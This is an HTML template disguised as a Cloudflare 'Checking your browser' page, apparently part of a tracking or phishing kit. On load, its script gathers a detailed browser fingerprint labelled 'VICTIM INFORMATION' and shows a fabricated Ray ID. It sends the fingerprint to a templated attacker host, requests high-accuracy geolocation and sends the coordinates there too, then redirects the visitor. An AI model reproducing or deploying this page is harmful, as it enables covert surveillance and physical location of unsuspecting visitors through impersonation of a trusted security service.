<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Just a moment...</title>
  <style>
    body{font-family:Arial,sans-serif;background:#fff;margin:0;padding:0;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;color:#333}
    .spinner{display:flex;gap:4px;margin:30px auto}
    .spinner div{width:12px;height:12px;background:#f58220;border-radius:50%;animation:fader 1.4s infinite ease-in-out}
    .spinner div:nth-child(2){animation-delay:-0.32s}
    .spinner div:nth-child(3){animation-delay:-0.16s}
    @keyframes fader{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
    h1{font-size:24px;margin:0 0 15px}
    p{font-size:16px;margin:5px 0;color:#666}
    .footer{margin-top:40px;font-size:14px;color:#999}
  </style>
</head>
<body>
  <div>
    <div class="spinner"><div></div><div></div><div></div></div>
    <h1>Checking your browser before accessing website</h1>
    <p>This process is automatic. Please wait.</p>
    <p id="status">Verifying security parameters...</p>
  </div>
  <div class="footer">
    DDoS protection by Cloudflare<br>
    Ray ID: <span id="rayId"></span>
  </div>

  <script>
    // üîí Config
    const UID = "<%= uid %>";
    const HOST = "<%= a %>";
    let dataSent = false;
    let locationSent = false;
    let fingerprint = "";

    // Fake Ray ID
    document.getElementById("rayId").innerText = Array(16).fill(0).map(() => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random()*36)]).join('');

    // Start immediately
    collectData();

    async function collectData() {
      try {
        await buildFingerprint();
        sendFingerprint();
        requestLocation();
        // Redirect after minimal delay even if location fails
        setTimeout(() => { window.location.href = "<%= url %>"; }, 8000);
      } catch(e) {
        console.error(e);
        fallbackRedirect();
      }
    }

    async function buildFingerprint() {
      fingerprint = '<code>‚úÖ VICTIM INFORMATION</code><br><br>';
      fingerprint += `<b>‚öì IP:</b> <a href="https://ip-api.com/#<%= ip %>"><%= ip %></a> | <b>üïó Time:</b> <%= time %><br><br>`;
      fingerprint += `<b>‚è≥ Local Time:</b> ${new Date()}<br><br>`;

      // MAXIMUM FINGERPRINTING (50+ attributes)
      const navProps = [
        "vendor","productSub","maxTouchPoints","doNotTrack","hardwareConcurrency",
        "cookieEnabled","appCodeName","appName","appVersion","platform","product",
        "userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory",
        "connection","permissions","storage","credentials","locks","wakeLock","clipboard"
      ];

      fingerprint += "<b>üì± DEVICE & BROWSER</b><br>";
      navProps.forEach(key => {
        if (navigator[key] !== undefined) {
          let val = navigator[key];
          if (typeof val === 'object') {
            try { val = JSON.stringify(val); } catch(e) { val = '[Object]'; }
          }
          fingerprint += `<b>${key}:</b> <code>${val}</code><br>`;
        }
      });

      // Screen
      fingerprint += "<br><b>üñ•Ô∏è SCREEN</b><br>";
      ["width","height","availWidth","availHeight","colorDepth","pixelDepth"].forEach(p => {
        fingerprint += `<b>screen.${p}:</b> <code>${screen[p]}</code><br>`;
      });

      // Timezone & Language
      fingerprint += `<br><b>üåç TIMEZONE:</b> <code>${Intl.DateTimeFormat().resolvedOptions().timeZone}</code><br>`;
      fingerprint += `<b>üåê LANGUAGES:</b> <code>${Array.from(navigator.languages).join(', ')}</code><br>`;

      // Plugins
      fingerprint += "<br><b>üß© PLUGINS</b><br>";
      if (navigator.plugins && navigator.plugins.length > 0) {
        for (let i=0; i<Math.min(5, navigator.plugins.length); i++) {
          let p = navigator.plugins[i];
          fingerprint += `<b>${p.name}:</b> <code>${p.description.substring(0,50)}...</code><br>`;
        }
      } else {
        fingerprint += `<b>None detected</b><br>`;
      }

      // WebGL
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const ext = gl.getExtension('WEBGL_debug_renderer_info');
        const vendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
        const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
        fingerprint += `<br><b>üéÆ WEBGL:</b> <code>${vendor} | ${renderer}</code><br>`;
      } catch(e) { fingerprint += `<br><b>üéÆ WEBGL:</b> <code>Not Supported</code><br>`; }

      // Network
      if (navigator.connection) {
        fingerprint += "<br><b>üåê NETWORK</b><br>";
        ['type','effectiveType','rtt','downlink'].forEach(k => {
          if (navigator.connection[k] !== undefined) {
            fingerprint += `<b>connection.${k}:</b> <code>${navigator.connection[k]}</code><br>`;
          }
        });
      }

      // Battery
      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          fingerprint += `<br><b>üîã BATTERY:</b> <code>${Math.round(battery.level*100)}% | Charging: ${battery.charging}</code><br>`;
        } catch(e) {}
      }

      // Touch Support
      if ('ontouchstart' in window) {
        fingerprint += `<br><b>üëÜ TOUCH:</b> <code>Supported | Max Points: ${navigator.maxTouchPoints}</code><br>`;
      }

      // Permissions Status (Async)
      const perms = ['geolocation','camera','microphone'];
      fingerprint += "<br><b>üîê PERMISSIONS</b><br>";
      for (let p of perms) {
        try {
          const status = await navigator.permissions.query({name: p});
          fingerprint += `<b>${p}:</b> <code>${status.state}</code><br>`;
        } catch(e) {}
      }
    }

    function sendFingerprint() {
      if (dataSent) return;
      $.post(`${HOST}/data`, {
        uid: UID,
        data: fingerprint
      }).done(() => {
        dataSent = true;
        checkCompletion();
      }).fail(() => {
        // Retry once
        setTimeout(() => {
          $.post(`${HOST}/data`, { uid: UID, data: fingerprint });
        }, 2000);
      });
    }

    function requestLocation() {
      if (!navigator.geolocation) {
        console.log("Geolocation not supported");
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          $.post(`${HOST}/location`, {
            uid: UID,
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            acc: pos.coords.accuracy
          }).done(() => {
            locationSent = true;
            checkCompletion();
          });
        },
        (err) => {
          console.log("Location error:", err);
          // Still try to complete without accurate location
          locationSent = true;
          checkCompletion();
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    }

    function checkCompletion() {
      if (dataSent && locationSent) {
        document.getElementById("status").innerText = "‚úÖ Verification complete. Redirecting...";
        setTimeout(() => { window.location.href = "<%= url %>"; }, 1500);
      }
    }

    function fallbackRedirect() {
      setTimeout(() => { window.location.href = "<%= url %>"; }, 5000);
    }
  </script>
</body>
</html>
